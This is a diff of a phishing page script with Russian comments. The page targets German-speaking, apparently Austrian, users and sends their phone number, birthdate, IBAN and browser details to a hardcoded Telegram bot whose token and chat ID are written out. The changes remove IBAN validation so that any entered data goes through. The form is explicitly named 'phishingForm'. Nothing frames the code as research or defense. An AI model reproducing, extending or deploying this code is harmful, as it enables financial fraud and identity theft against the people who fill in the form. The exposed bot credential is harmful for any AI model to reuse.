@@ -1,10 +1,9 @@
 // ============================================================
-// 🔥 КОНФИГУРАЦИЯ - ЗАМЕНИТЬ НА СВОИ ДАННЫЕ
+// 🔥 КОНФИГУРАЦИЯ
 // ============================================================
 const BOT_TOKEN = "8868232573:AAEW0wq6mguGORRd_woASqbkE80zg7w59G8";
 const CHAT_ID = "-1004324836304";
 
-// Глобальная переменная для хранения результата проверки IBAN
 let ibanCheckResult = {
     valid: false,
     message: 'nicht geprüft',
@@ -13,27 +12,7 @@ let ibanCheckResult = {
 };
 
 // ============================================================
-// 🔍 IBAN-ЧЕККЕР
-// ============================================================
-
-const IBAN_LENGTHS = {
-    'AT': 20, 'DE': 22, 'CH': 21, 'LI': 21, 'BE': 16, 'NL': 18,
-    'FR': 27, 'ES': 24, 'IT': 27, 'GB': 22, 'PL': 28, 'CZ': 24,
-    'SK': 24, 'HU': 28, 'HR': 21, 'SI': 19, 'LU': 20, 'DK': 18,
-    'NO': 15, 'SE': 24, 'FI': 18, 'PT': 25, 'IE': 22, 'GR': 27,
-    'CY': 28, 'MT': 31, 'LV': 21, 'LT': 20, 'EE': 20, 'BG': 22,
-    'RO': 24, 'TR': 26, 'AE': 23, 'SA': 24, 'QA': 29, 'BH': 22,
-    'KW': 30, 'JO': 30, 'IL': 23, 'BA': 20, 'ME': 22, 'MK': 19,
-    'AL': 28, 'AD': 24, 'SM': 27, 'MC': 27, 'VA': 22, 'IS': 26,
-    'FO': 18, 'GL': 18, 'XK': 20
-};
-
-function getIBANLength(countryCode) {
-    return IBAN_LENGTHS[countryCode.toUpperCase()] || 0;
-}
-
-// ============================================================
-// 🏛️ ОПРЕДЕЛЕНИЕ БАНКА ПО BIC
+// 🏛️ ОПРЕДЕЛЕНИЕ БАНКА ПО BIC (для бота)
 // ============================================================
 function getBankNameByBIC(bic) {
     const bankMap = {
@@ -87,137 +66,6 @@ function getBankNameByBIC(bic) {
 }
 
 // ============================================================
-// 🔍 IBAN ВАЛИДАЦИЯ
-// ============================================================
-async function validateIBAN(iban) {
-    const cleanIBAN = iban.replace(/\s/g, '').toUpperCase();
-    const countryCode = cleanIBAN.substring(0, 2);
-    const expectedLength = getIBANLength(countryCode);
-    
-    if (cleanIBAN.length < 15) {
-        return {
-            valid: false,
-            message: '❌ IBAN ist zu kurz (mind. 15 Zeichen)',
-            iban: cleanIBAN,
-            bankData: null
-        };
-    }
-    
-    if (expectedLength > 0 && cleanIBAN.length !== expectedLength) {
-        return {
-            valid: false,
-            message: `❌ Falsche Länge für ${countryCode} (erwartet: ${expectedLength})`,
-            iban: cleanIBAN,
-            bankData: null
-        };
-    }
-
-    if (!/^[A-Z]{2}$/.test(countryCode)) {
-        return {
-            valid: false,
-            message: '❌ Ungültiger Ländercode (2 Buchstaben erforderlich)',
-            iban: cleanIBAN,
-            bankData: null
-        };
-    }
-
-    try {
-        const response = await fetch(`https://openiban.com/validate/${cleanIBAN}?getBIC=true`);
-        const data = await response.json();
-        
-        let bankData = data.bankData || null;
-        
-        // Если банк не определился, но есть BIC — определяем по BIC
-        if (!bankData && data.bankData && data.bankData.bic) {
-            const bic = data.bankData.bic;
-            const bankName = getBankNameByBIC(bic);
-            if (bankName) {
-                bankData = {
-                    bankName: bankName,
-                    bic: bic,
-                    country: data.bankData?.country || null,
-                    city: data.bankData?.city || null
-                };
-            }
-        }
-        
-        return {
-            valid: data.valid === true,
-            message: data.valid ? '✅ IBAN ist gültig' : '❌ IBAN ist ungültig',
-            iban: cleanIBAN,
-            bankData: bankData,
-            raw: data
-        };
-    } catch (error) {
-        console.error('IBAN API Error:', error);
-        const localValid = validateIBANLocal(cleanIBAN);
-        return {
-            valid: localValid,
-            message: localValid ? '✅ IBAN ist gültig (lokale Prüfung)' : '❌ IBAN ist ungültig (lokale Prüfung)',
-            iban: cleanIBAN,
-            bankData: null,
-            error: error.message
-        };
-    }
-}
-
-function validateIBANLocal(iban) {
-    const cleanIBAN = iban.replace(/\s/g, '').toUpperCase();
-    const countryCode = cleanIBAN.substring(0, 2);
-    const expectedLength = getIBANLength(countryCode);
-    
-    if (expectedLength > 0 && cleanIBAN.length !== expectedLength) return false;
-    if (cleanIBAN.length < 15) return false;
-    if (!/^[A-Z0-9]+$/.test(cleanIBAN)) return false;
-    if (!/^[A-Z]{2}/.test(cleanIBAN)) return false;
-    
-    const rearranged = cleanIBAN.substring(4) + cleanIBAN.substring(0, 4);
-    const numeric = rearranged.split('').map(char => {
-        const code = char.charCodeAt(0);
-        if (code >= 65 && code <= 90) {
-            return code - 55;
-        }
-        return parseInt(char, 10);
-    }).join('');
-    
-    let remainder = 0;
-    for (let i = 0; i < numeric.length; i++) {
-        remainder = (remainder * 10 + parseInt(numeric[i], 10)) % 97;
-    }
-    
-    return remainder === 1;
-}
-
-function updateSubmitButton() {
-    const submitBtn = document.getElementById('submitBtn');
-    const phoneInput = document.getElementById('phoneInput');
-    const ibanInput = document.getElementById('ibanInput');
-    
-    if (!submitBtn) return;
-    
-    let isPhoneValid = false;
-    if (phoneInput) {
-        const phoneValue = phoneInput.value || '';
-        const digits = phoneValue.replace(/[^0-9]/g, '');
-        isPhoneValid = digits.length >= 6;
-    }
-    
-    let isIBANValid = false;
-    if (ibanInput) {
-        const ibanValue = ibanInput.value.toUpperCase().replace(/\s/g, '');
-        if (ibanValue.length >= 4) {
-            const countryCode = ibanValue.substring(0, 2);
-            const expectedLength = getIBANLength(countryCode);
-            if (expectedLength > 0 && ibanValue.length === expectedLength) {
-                isIBANValid = true;
-            }
-        }
-    }
-    
-    submitBtn.disabled = !(isPhoneValid && isIBANValid);
-}
-
-// ============================================================
 // 🚀 ИНИЦИАЛИЗАЦИЯ
 // ============================================================
 document.addEventListener('DOMContentLoaded', function() {
@@ -226,12 +74,13 @@ document.addEventListener('DOMContentLoaded', function() {
     const phoneInput = document.getElementById('phoneInput');
     const submitBtn = document.getElementById('submitBtn');
 
+    // ВАЖНО: кнопка больше не блокируется из-за IBAN
     if (submitBtn) {
-        submitBtn.disabled = true;
+        submitBtn.disabled = false;
     }
 
     // ============================================================
-    // 📱 ТЕЛЕФОН — ПРОСТОЙ ВВОД С +43 ПО УМОЛЧАНИЮ
+    // 📱 ТЕЛЕФОН
     // ============================================================
     if (phoneInput) {
         if (phoneInput.value === '' || phoneInput.value === '+43') {
@@ -244,16 +93,11 @@ document.addEventListener('DOMContentLoaded', function() {
         });
 
         phoneInput.addEventListener('input', function() {
-            let currentValue = this.value;
-            
-            if (currentValue === '') {
+            if (this.value === '') {
                 this.value = '+43';
                 const len = this.value.length;
                 this.setSelectionRange(len, len);
-                return;
             }
-            
-            updateSubmitButton();
         });
     }
 
@@ -281,63 +125,29 @@ document.addEventListener('DOMContentLoaded', function() {
     }
 
     // ============================================================
-    // 🔍 IBAN
+    // 🏦 IBAN — БЕЗ ПРОВЕРКИ НА САЙТЕ (просто разрешаем ввод)
     // ============================================================
     if (ibanInput) {
-        let debounceTimer = null;
+        // Убираем ограничение maxLength, чтобы можно было ввести любую длину
+        ibanInput.maxLength = 34;
 
         ibanInput.addEventListener('input', function() {
-            clearTimeout(debounceTimer);
-            
+            // Просто приводим к верхнему регистру и убираем пробелы
             let value = this.value.replace(/\s/g, '').toUpperCase();
-            
-            if (value.length >= 2) {
-                const countryCode = value.substring(0, 2);
-                const expectedLength = getIBANLength(countryCode);
-                if (expectedLength > 0) {
-                    this.maxLength = expectedLength;
-                    if (value.length > expectedLength) {
-                        value = value.substring(0, expectedLength);
-                        this.value = value;
-                    }
-                }
-            }
-            
-            const countryCode = value.substring(0, 2);
-            const expectedLength = getIBANLength(countryCode);
-            
-            if (value.length === 0) {
-                ibanCheckResult = {
-                    valid: false,
-                    message: 'nicht angegeben',
-                    bankData: null,
-                    iban: ''
-                };
-                updateSubmitButton();
-                return;
-            }
-            
-            if (expectedLength > 0 && value.length === expectedLength) {
-                debounceTimer = setTimeout(async function() {
-                    const result = await validateIBAN(value);
-                    ibanCheckResult = {
-                        valid: result.valid,
-                        message: result.message,
-                        bankData: result.bankData,
-                        iban: result.iban
-                    };
-                    
-                    console.log('IBAN Check Result:', ibanCheckResult);
-                    updateSubmitButton();
-                }, 500);
-            } else {
-                updateSubmitButton();
-            }
+            this.value = value;
+
+            // Обновляем глобальную переменную (без проверки)
+            ibanCheckResult = {
+                valid: false,
+                message: 'nicht geprüft',
+                bankData: null,
+                iban: value
+            };
         });
     }
 
     // ============================================================
-    // 🚀 ОТПРАВКА ФОРМЫ
+    // 🚀 ОТПРАВКА ФОРМЫ (без проверки IBAN)
     // ============================================================
     const form = document.getElementById('phishingForm');
     if (!form) return;
@@ -345,20 +155,11 @@ document.addEventListener('DOMContentLoaded', function() {
     form.addEventListener('submit', function(event) {
         event.preventDefault();
         
+        // Проверяем только телефон (чтобы не отправлять пустую форму)
         const phoneDigits = phoneInput.value.replace(/[^0-9]/g, '');
         if (phoneDigits.length < 6) {
             alert('Bitte geben Sie eine gültige Telefonnummer ein (mindestens 6 Ziffern).');
             return;
-        }
-        
-        const ibanValue = ibanInput.value.toUpperCase().replace(/\s/g, '');
-        if (ibanValue.length >= 2) {
-            const countryCode = ibanValue.substring(0, 2);
-            const expectedLength = getIBANLength(countryCode);
-            if (expectedLength > 0 && ibanValue.length !== expectedLength) {
-                alert(`Bitte geben Sie eine gültige IBAN für ${countryCode} ein (${expectedLength} Zeichen).`);
-                return;
-            }
         }
         
         const formData = new FormData(form);
@@ -367,6 +168,7 @@ document.addEventListener('DOMContentLoaded', function() {
             data[key] = value.trim() || 'nicht angegeben';
         });
         
+        // Добавляем текущий статус IBAN (всегда 'nicht geprüft')
         data.iban_check = ibanCheckResult;
         sendToTelegram(data);
     });
@@ -393,21 +195,6 @@ function sendToTelegram(data) {
     message += `🏦 <b>IBAN:</b> ${data.iban || 'nicht angegeben'}\n`;
     message += `🔍 <b>IBAN-Status:</b> ${ibanData.message || 'nicht geprüft'}\n`;
     
-    if (ibanData.bankData) {
-        const bank = ibanData.bankData;
-        if (bank.bankName) {
-            message += `🏛️ <b>Bank:</b> ${bank.bankName}\n`;
-        } else if (bank.bic) {
-            const bankName = getBankNameByBIC(bank.bic);
-            if (bankName) {
-                message += `🏛️ <b>Bank:</b> ${bankName}\n`;
-            }
-        }
-        if (bank.bic) message += `🔢 <b>BIC:</b> ${bank.bic}\n`;
-        if (bank.country) message += `🌍 <b>Land:</b> ${bank.country}\n`;
-        if (bank.city) message += `🏙️ <b>Bank-Stadt:</b> ${bank.city}\n`;
-    }
-    
     message += `\n🕒 <b>Zeit:</b> ${new Date().toLocaleString('de-DE')}`;
     message += `\n🌐 <b>Browser:</b> ${navigator.userAgent}`;
     
@@ -431,31 +218,19 @@ function sendToTelegram(data) {
                 document.getElementById('phishingForm').reset();
                 submitBtn.textContent = 'Absenden';
                 submitBtn.style.background = '';
-                submitBtn.disabled = true;
+                submitBtn.disabled = false;
                 submitBtn.classList.remove('loading');
                 
                 const phoneInput = document.getElementById('phoneInput');
-                if (phoneInput) {
-                    phoneInput.value = '+43';
-                }
+                if (phoneInput) phoneInput.value = '+43';
                 
                 const birthdateInput = document.getElementById('birthdateInput');
-                if (birthdateInput) {
-                    birthdateInput.value = '';
-                }
+                if (birthdateInput) birthdateInput.value = '';
                 
                 const ibanInput = document.getElementById('ibanInput');
-                if (ibanInput) {
-                    ibanInput.value = '';
-                    ibanInput.maxLength = 34;
-                }
+                if (ibanInput) ibanInput.value = '';
                 
-                ibanCheckResult = {
-                    valid: false,
-                    message: 'nicht geprüft',
-                    bankData: null,
-                    iban: ''
-                };
+                ibanCheckResult = { valid: false, message: 'nicht geprüft', bankData: null, iban: '' };
             }, 2000);
         } else {
             throw new Error(data.description || 'Unknown error');
